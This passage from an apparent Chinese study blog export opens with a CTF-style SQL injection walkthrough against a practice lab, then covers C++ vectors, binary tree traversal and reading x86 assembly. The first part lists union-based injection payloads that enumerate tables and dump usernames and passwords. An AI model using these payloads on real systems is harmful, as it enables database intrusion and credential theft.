class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>?id&#x3D;1</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155538976.png" class title="This is an image">

<p>?id&#x3D;2</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155733577.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  报错</span><br><span class="line">?id=1&#x27; and 1=1 报错</span><br><span class="line">?id=1&#x27; and 1=1 --+ 正常</span><br></pre></td></tr></table></figure>

<p>判断为字符型注入</p>
<p><strong>联合注入：</strong></p>
<p>1.首先要知道表格有几列，如果报错就是超过列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161209319.png" class title="This is an image">

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161327329.png" class title="This is an image">

<p>说明表格有3列</p>
<p>2.爆出显示位，就是看看表格中哪些列是显示在页面中的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>



<p>3.获取当前的数据名和版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>

<p>可以知道，当前数据看是security，版本是5.7.26</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161822154.png" class title="This is an image">

<p>4.爆表名</p>
<p>爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162006151.png" class title="This is an image">

<p>5.爆字段名</p>
<p>通过上面的查询我们知道当前数据库有四个表，根据表名我们猜测可能用户的账户和密码在users表中。所以我们要想办法得到该表下的字段名和内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162115279.png" class title="This is an image">

<p>6.通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username , password) from users--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162232278.png" class title="This is an image">
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>vector</title>
    <url>/2023/01/24/vector/</url>
    <content><![CDATA[<h2 id="什么是vector"><a href="#什么是vector" class="headerlink" title="什么是vector"></a>什么是vector</h2><p>vector（是一个模板类）是c++中的一种容器，简单说就算一个不定长的数组。它把一些常用操作“封装”在了vector类型内部。vector 的长度可变，随着往vector里面加数，vector长度会随着增加。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector &lt;<span class="type">int</span>&gt; v;<span class="comment">//v=[]</span></span><br><span class="line">x=(<span class="type">int</span>)v.<span class="built_in">size</span>();<span class="comment">//x=0</span></span><br><span class="line">v.<span class="built_in">push_back</span>(<span class="number">2</span>);<span class="comment">//v=[2] 无返回值</span></span><br><span class="line">x=(<span class="type">int</span>)v.<span class="built_in">size</span>();<span class="comment">//x=1</span></span><br></pre></td></tr></table></figure>

<h2 id="vector的基本操作"><a href="#vector的基本操作" class="headerlink" title="vector的基本操作"></a>vector的基本操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; c</span><br><span class="line">c.clear()            //移除容器中所有数据。</span><br><span class="line">c.empty()            //判断容器是否为空。</span><br><span class="line">c.erase(pos)         //删除pos位置的数据</span><br><span class="line">c.erase(beg,end)     //删除[beg,end)区间的数据</span><br><span class="line">c.front()            //传回第一个数据。</span><br><span class="line">c.insert(pos,elem)   //在pos位置插入一个elem拷贝</span><br><span class="line">c.pop_back()         //删除最后一个数据。</span><br><span class="line">c.push_back(elem)    //在尾部加入一个数据。</span><br><span class="line">c.resize(num)        //重新设置该容器的大小</span><br><span class="line">c.size()             //回容器中实际数据的个数。</span><br><span class="line">c.begin()            //返回指向容器第一个元素的迭代器</span><br><span class="line">c.end()              //返回指向容器最后一个元素的迭代器</span><br></pre></td></tr></table></figure>

<h2 id="二维vector的初始化"><a href="#二维vector的初始化" class="headerlink" title="二维vector的初始化"></a>二维vector的初始化</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;<span class="built_in">a</span>(<span class="number">3</span>);<span class="comment">//a[[],[],[]]</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    a[i].<span class="built_in">resize</span>(<span class="number">3</span>);</span><br><span class="line">&#125;<span class="comment">//a=[[0,0,0],[0,0,0],[0,0,0]]</span></span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="小明爱数列"><a href="#小明爱数列" class="headerlink" title="小明爱数列"></a>小明爱数列</h3><p>小明非常喜欢数列，于是他提出了一个关于数列的问题。他拿到一个长度为 n 的数列，之后对这个数列进行了两种操作：</p>
<p>第一种： Dx</p>
<p>表示删除数列第 x 位置的一个数字，后面的数字向前移动（若 x&gt; 此时数列长度则操作无效）；</p>
<p>第二种： Zxy</p>
<p>表示在数列的第 x 位置插入一个数字 y ，后面的数字向后移动（若 x&gt; 此时数列长度则在数列末尾插入 y ）；</p>
<p>经过 k 次这两种操作以后，小明想要知道现在的数列是什么，聪明的你可以帮助小明解决这个问题吗？</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入包括 k+2 行数据；<br>第一行包括两个数 n,k ，分别表示数列中数的个数以及操作的次数，其中 1&#x3D;&lt;k≤n&lt;5000 ；<br>第二行 n 个数表示该数列的 n 个数，以空格隔开，其中任意数 ai 为 int 范围内的整数；<br>第三行到第 k+2 行，每行一个操作，格式见题面描述。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出包括两行；<br>第一行一个数 m ，表示全部操作之后数组的长度；<br>第二行 m 个数，表示当前的数组。</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 3</span><br><span class="line">4 5 2 1</span><br><span class="line">Z 3 3</span><br><span class="line">Z 0 1</span><br><span class="line">D 2</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">1 4 2 3 1</span><br></pre></td></tr></table></figure>

<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>输出包括两行；<br>第一行一个数 m ，表示全部操作之后数组的长度；<br>第二行 m 个数，表示当前的数组。</p>
<h4 id="样例解释"><a href="#样例解释" class="headerlink" title="样例解释"></a>样例解释</h4><p>初始数组为(4521)</p>
<p>执行完 Z33 得到(45231)</p>
<p>执行完 Z01 得到(145231)</p>
<p>执行完 D2 得到(14231) </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; c;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,x,k;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">		cin&gt;&gt;x;</span><br><span class="line">		c.<span class="built_in">push_back</span>(x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> index,value;</span><br><span class="line">	<span class="type">char</span> W;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">		cin&gt;&gt;W;</span><br><span class="line">		<span class="keyword">if</span>(W==<span class="string">&#x27;Z&#x27;</span>)&#123;</span><br><span class="line">			cin&gt;&gt;index&gt;&gt;value;</span><br><span class="line">			c.<span class="built_in">insert</span>(c.<span class="built_in">begin</span>()+<span class="built_in">min</span>((<span class="type">int</span>)c.<span class="built_in">size</span>(),index),value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cin&gt;&gt;index;</span><br><span class="line">			<span class="keyword">if</span>(index&lt;c.<span class="built_in">size</span>())&#123;</span><br><span class="line">				c.<span class="built_in">erase</span>(c.<span class="built_in">begin</span>()+index);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;c.<span class="built_in">size</span>()&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;c.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">		cout&lt;&lt;c[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树的遍历</title>
    <url>/2023/01/08/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h1 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h1><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>对于一个有限元素的集合，遍历是一种对该集合中的每个元素访问且仅访问一次的操作</p>
<ul>
<li>先序遍历（深度优先）</li>
<li>中序遍历（深度优先）</li>
<li>后序遍历（深度优先）</li>
<li>层次遍历（宽度优先）</li>
</ul>
<h3 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h3><p>先访问根结点，再依次遍历左、右子树</p>
<p><strong>算法思想</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若二叉树为空，则空操作返回;</span><br><span class="line">否则，执行以下步骤：</span><br><span class="line"> 访问根结点</span><br><span class="line"> 先序遍历左子树</span><br><span class="line"> 先序遍历右子树</span><br></pre></td></tr></table></figure>

<h3 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h3><p>先遍历左子树，再访问根结点，最后遍历右子树</p>
<p><strong>特性：</strong></p>
<ul>
<li>根结点左子树中所有结点一定先于根结点访问输出</li>
<li>根结点右子树中所有结点一定在根结点之后访问输出</li>
</ul>
<h3 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h3><p>先依次遍历左、右子树，最后访问根结点</p>
<p><strong>特性：</strong></p>
<p>对于一棵二叉树而言，最后访问输出的是该二叉树的根结点</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><p>问题描述：给定一棵树，输出树的根root，孩子最多的结点max以及他的孩子</p>
<p>输入格式：</p>
<ul>
<li><p>第一行：n(结点个数&lt;&#x3D;100)，m(边数&lt;&#x3D;200)</p>
</li>
<li><p>以下m行：每行两个结点x和y，表示y是x的孩子(x,y&lt;&#x3D;1000)</p>
</li>
</ul>
<p>输出格式：</p>
<p>第一行：树根:root</p>
<p>第二行：孩子最多的结点max</p>
<p>第三行：max的孩子</p>
<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>1、输入说明：输入第1行给出正整数N（N≤50），为树中结点总数。随后2行先后给出先序和中序遍历序列，均是长度为N的不包含重复英文字母（区别大小写）的字符串。</p>
<p>2、输出说明：输出为一个整数，即该二叉树的高度。</p>
<p>本题需要解决两个子问题：</p>
<p>(1)通过输入给定的先序遍历两个序列构建对应二叉树。由于我们知道先序遍历序列的第1个结点必然是根结点，可以在中序遍历序列中找到这个根结点的位置，于是就知道在中序遍历序列中，根结点左边的所有结点一定属于左子树，右边的所有结点一定属于右子树。根据这个判断，可以从中序遍历序列中知道左、右子树分别有L和R个结点，它们必然对应存储在先序遍历序列中第2~（L+1）个结点以及最后的R个结点。于是可以对左、右子树递归地解决这个问题，直到生成整个二叉树。</p>
<p>(2)求二叉树的高度。如果已经知道左、右子树的高度，那么树的高度就是左、右子树中比较高的那个高度加1。这是一个可以用二叉树后序遍历解决的问题，在遍历过程中，我们将“访问结点”定义为“求左、右子树高度的较大值并加1”。</p>
]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>从汇编角度看程序</title>
    <url>/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="if-else-单分支识别"><a href="#if-else-单分支识别" class="headerlink" title="if else 单分支识别"></a>if else 单分支识别</h1><p>OD载入，找到main函数</p>
<img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221229194153894.png" class title="This is an image">

<p>关键逻辑其实就是下面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| mov dword ptr ss:[ebp-C],0                    | 声明一个局部变量 flag=0</span><br><span class="line">| lea eax,dword ptr ss:[ebp-C]                  | 将ebp-c的地址赋给eax</span><br><span class="line">| push eax                                      | 将eax压栈</span><br><span class="line">| push test.18FE60                              | 18FE60:&quot;%d&quot;   </span><br><span class="line">| call test.E54EF                               | 调用函数scanf(&quot;%d&quot;,&amp;flag);</span><br><span class="line">| add esp,8                                     | 平衡堆栈</span><br><span class="line">| cmp dword ptr ss:[ebp-C],5                    | 将flag的值与0x5进行一个比较</span><br><span class="line">| jne test.EA282                                | 等于就顺序执行，不等于就跳转</span><br><span class="line">| push test.18FE64                              | 18FE64:&quot;nFlag = 5!\n&quot;</span><br><span class="line">| call test.E6516                               | 调用函数printf</span><br><span class="line">| add esp,4                                     | 平栈</span><br><span class="line">| jmp test.EA28F                                |</span><br><span class="line">| push test.18FE74                              | 18FE74:&quot;nFlag != 5!\n&quot;</span><br><span class="line">| call test.E6516                               | 调用函数printf</span><br><span class="line">| add esp,4                                     |</span><br></pre></td></tr></table></figure>

<h1 id="switch多分支识别"><a href="#switch多分支识别" class="headerlink" title="switch多分支识别"></a>switch多分支识别</h1>

<p>其实switch多分支有个很明显的特征就是分支表</p>
<img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221229205352666.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| mov dword ptr ss:[ebp-C],0                    | 声明一个局部变量 flag=0</span><br><span class="line">| lea eax,dword ptr ss:[ebp-C]                  | 将ebp-c的地址赋给eax</span><br><span class="line">| push eax                                      |</span><br><span class="line">| push switch多分支样本.4AFE50                       | 4AFE50:&quot;%d&quot;</span><br><span class="line">| call switch多分支样本.4054EF                       | 调用函数scanf</span><br><span class="line">| add esp,8                                     | 平栈</span><br><span class="line">| mov eax,dword ptr ss:[ebp-C]                  | eax=flag=0</span><br><span class="line">| mov dword ptr ss:[ebp-D4],eax                 | </span><br><span class="line">| cmp dword ptr ss:[ebp-D4],6                   | 比较</span><br><span class="line">| ja switch多分支样本.40A2E6                     | 如果flag&gt;0x6,就跳出分支,否则顺序执行</span><br><span class="line">| mov ecx,dword ptr ss:[ebp-D4]                 | ecx:EntryPoint</span><br><span class="line">| jmp dword ptr ds:[ecx*4+40A334]               | 根据输入的数的条件进行跳转</span><br><span class="line">| push switch多分支样本.4AFE54                       | case 0</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE58                       | case 1</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE5C                       | case 2</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE60                       | case 3</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE64                       | case 4</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE68                       | case 5</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br><span class="line">| jmp switch多分支样本.40A2E6                        |</span><br><span class="line">| push switch多分支样本.4AFE6C                       | case 6</span><br><span class="line">| call switch多分支样本.406516                       |</span><br><span class="line">| add esp,4                                     |</span><br></pre></td></tr></table></figure>

<h1 id="for循环识别"><a href="#for循环识别" class="headerlink" title="for循环识别"></a>for循环识别</h1><img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221229210431415.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| mov dword ptr ss:[ebp-8],0                    | flag=0</span><br><span class="line">| jmp 17.for循环识别.88D3D0                         |无条件转跳至cmp</span><br><span class="line">| mov eax,dword ptr ss:[ebp-8]                  | eax=flag eax=0</span><br><span class="line">| add eax,1                                     | 自增 eax++</span><br><span class="line">| mov dword ptr ss:[ebp-8],eax                  | flag=eax flag=1</span><br><span class="line">| cmp dword ptr ss:[ebp-8],64                   | 对比flag与0x64</span><br><span class="line">| jge 17.for循环识别.88D3E9                         | 如果&gt;=0x64就跳出循环</span><br><span class="line">| mov eax,dword ptr ss:[ebp-8]                  | eax=flag eax=0</span><br><span class="line">| push eax                                      |</span><br><span class="line">| push 17.for循环识别.91BE50                        | 91BE50:&quot;%d&quot;</span><br><span class="line">| call 17.for循环识别.889E81                        | printf</span><br><span class="line">| add esp,8                                     |</span><br><span class="line">| jmp 17.for循环识别.88D3C7                         | 无条件跳转至第三行</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码：</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h1><p>在编写Win32应用程序时，都必须在源码里实现一个WinMain函数，但windows程序的执行并不是从WinMain函数开始的，首先被执行的是启动函数的相关代码，这段代码由编译器生成，在启动代码初始化进程完成后，才会调用WinMain函数</p>
<p>启动函数的作用基本相同，包括检索指向新进程的命令行指针，检索指向新进程的环境变量指针，全局变量初始化，内存栈初始化等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401180 &gt;/$  55            push ebp</span><br><span class="line">00401181  |.  8BEC          mov ebp,esp</span><br><span class="line">00401183  |.  6A FF         push -0x1</span><br><span class="line">00401185  |.  68 D0404000   push ReverseM.004040D0</span><br><span class="line">0040118A  |.  68 B41C4000   push ReverseM.00401CB4                         ;  SE 处理程序安装</span><br><span class="line">0040118F  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br><span class="line">00401195  |.  50            push eax</span><br><span class="line">00401196  |.  64:8925 00000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">0040119D  |.  83EC 58       sub esp,0x58</span><br><span class="line">004011A0  |.  53            push ebx</span><br><span class="line">004011A1  |.  56            push esi                                       ;  ReverseM.&lt;ModuleEntryPoint&gt;</span><br><span class="line">004011A2  |.  57            push edi                                       ;  ReverseM.&lt;ModuleEntryPoint&gt;</span><br><span class="line">004011A3  |.  8965 E8       mov [local.6],esp</span><br><span class="line">004011A6  |.  FF15 40404000 call dword ptr ds:[&lt;&amp;KERNEL32.GetVersion&gt;]     ;  确定系统的版本</span><br><span class="line">...</span><br><span class="line">004011F4  |.  FF15 3C404000 call dword ptr ds:[&lt;&amp;KERNEL32.GetCommandLineA&gt;&gt;; 指向进程的完整命令行指针</span><br><span class="line">004011FA  |.  A3 D8594000   mov dword ptr ds:[0x4059D8],eax</span><br><span class="line">004011FF  |.  E8 9F060000   call ReverseM.004018A3</span><br><span class="line">00401204  |.  A3 C0544000   mov dword ptr ds:[0x4054C0],eax</span><br><span class="line">00401209  |.  E8 48040000   call ReverseM.00401656</span><br><span class="line">0040120E  |.  E8 8A030000   call ReverseM.0040159D</span><br><span class="line">00401213  |.  E8 A7000000   call ReverseM.004012BF</span><br><span class="line">00401218  |.  8975 D0       mov [local.12],esi                             ;  ReverseM.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040121B  |.  8D45 A4       lea eax,[local.23]                             ;  </span><br><span class="line">0040121E  |.  50            push eax                                       ; /pStartupinfo = 0019FFCC</span><br><span class="line">0040121F  |.  FF15 38404000 call dword ptr ds:[&lt;&amp;KERNEL32.GetStartupInfoA&gt;&gt;; \GetStartupInfoA     获取一个进程的启动信息</span><br><span class="line">...</span><br><span class="line">00401241  |.  56            push esi                                       ; /pModule = &quot;U嬱jh蠤@&quot;</span><br><span class="line">00401242  |.  FF15 34404000 call dword ptr ds:[&lt;&amp;KERNEL32.GetModuleHandleA&gt;; \GetModuleHandleA    返回进程地址空间执行文件基地址</span><br><span class="line">00401248  |.  50            push eax</span><br><span class="line">00401249  |.  E8 B2FDFFFF   call ReverseM.00401000                         ;  调用用户编写的进入点函数Winmain</span><br><span class="line">0040124E  |.  8945 A0       mov [local.24],eax</span><br><span class="line">00401251  |.  50            push eax</span><br><span class="line">00401252  |.  E8 95000000   call ReverseM.004012EC                         ;  exit或者ExitProcess</span><br></pre></td></tr></table></figure>

<h1 id="函数识别"><a href="#函数识别" class="headerlink" title="函数识别"></a>函数识别</h1><p>程序来源于《加密与解密》的附件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;</span><br><span class="line">main( )</span><br><span class="line">&#123;</span><br><span class="line">	 	<span class="type">int</span> a=<span class="number">5</span>,b=<span class="number">6</span>;</span><br><span class="line">		Add(a,b);</span><br><span class="line">	 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">Add(<span class="type">int</span> x,<span class="type">int</span> y)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">return</span>(x+y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221229213037815.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里跟进了函数401000</span><br><span class="line">| push 6                            | 参数1</span><br><span class="line">| push 5                            | 参数2</span><br><span class="line">| call add.401010                   | 调用的函数 call=push eip jmp 401010</span><br><span class="line">| add esp,8                         |</span><br><span class="line">| xor eax,eax                       | 对eax进行一个清零</span><br><span class="line"> ret                               |</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数 401010</span><br><span class="line">| mov eax,dword ptr ss:[esp+8]      | [esp+8]:&amp;&quot;C:\\Users\\duodu\\Desktop\\add.exe&quot;</span><br><span class="line">| mov ecx,dword ptr ss:[esp+4]      |</span><br><span class="line">| add eax,ecx                       | eax:&amp;&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line">| ret                               |</span><br><span class="line">加完存在了eax里</span><br></pre></td></tr></table></figure>

<h1 id="利用堆栈传递参数"><a href="#利用堆栈传递参数" class="headerlink" title="利用堆栈传递参数"></a>利用堆栈传递参数</h1><img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221231105248155.png" class title="This is an image">

<p>关键函数就是40101F</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0040101F            | 55                  | push ebp                       |保护现场原先EBP指针</span><br><span class="line">00401020            | 8BEC                | mov ebp,esp                    |设置新的EBP指针，指向栈顶</span><br><span class="line">00401022            | 83EC 04             | sub esp,4                      |分配局部变量所有空间</span><br><span class="line">00401025            | 8B45 0C             | mov eax,dword ptr ss:[ebp+C]   |调用参数2</span><br><span class="line">00401028            | 8B5D 08             | mov ebx,dword ptr ss:[ebp+8]   |调用参数1</span><br><span class="line">0040102B            | 895D FC             | mov dword ptr ss:[ebp-4],ebx   |将参数1放在局部变量里</span><br><span class="line">0040102E            | 0345 FC             | add eax,dword ptr ss:[ebp-4]   |参数2与局部变量相加</span><br><span class="line">00401031            | 83C4 04             | add esp,4                      |释放局部变量所有空间</span><br><span class="line">00401034            | 5D                  | pop ebp                        |恢复现场ebp指针</span><br><span class="line">00401035            | C2 0800             | ret 8                          |</span><br></pre></td></tr></table></figure>

<p><strong>注：</strong></p>
<p>一般来说，ebp +普遍是参数，ebp -普遍是局部变量</p>
